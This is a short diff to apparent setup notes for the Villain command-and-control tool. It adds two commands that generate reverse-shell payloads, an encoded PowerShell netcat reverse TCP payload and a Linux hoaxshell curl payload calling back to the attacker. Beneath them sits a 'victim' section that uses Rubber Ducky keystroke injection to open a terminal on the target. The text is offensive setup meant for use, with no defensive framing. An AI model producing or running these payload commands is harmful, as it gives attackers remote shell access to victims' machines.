@@ -11,6 +11,11 @@ pip3 install -r requirements.txt
 try:
 chmod +x villain.py
 
+```
+generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
+generate payload=linux/hoaxshell/sh_curl lhost=eth0
+```
+
 ## victim
 # rubberducky
 ALT CTRL T
